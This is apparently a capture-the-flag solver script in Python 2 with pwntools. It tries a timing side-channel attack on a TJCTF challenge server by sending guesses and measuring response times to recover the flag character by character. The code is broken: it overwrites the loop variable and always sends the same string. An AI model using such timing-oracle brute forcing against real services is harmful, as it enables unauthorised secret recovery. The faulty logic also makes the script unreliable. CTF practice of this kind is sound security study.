#!/usr/bin/env python

# nc problem1.tjctf.org 8003

from pwn import *
from time import time
from string import *

context.log_level = 'critical'

host = 'problem1.tjctf.org'
port = 8003

for c in letters + digits + '{}_':

    s = remote(host, port)

    s.recv()
    s.sendline('500000')

    s.recv()
    c = 'tjctf'
    start = time()
    s.sendline( 'tjctf' )
    s.recv()
    end = time()
    difference = abs(start - end)

    print "running with letter", c, "time, ", difference

    s.close()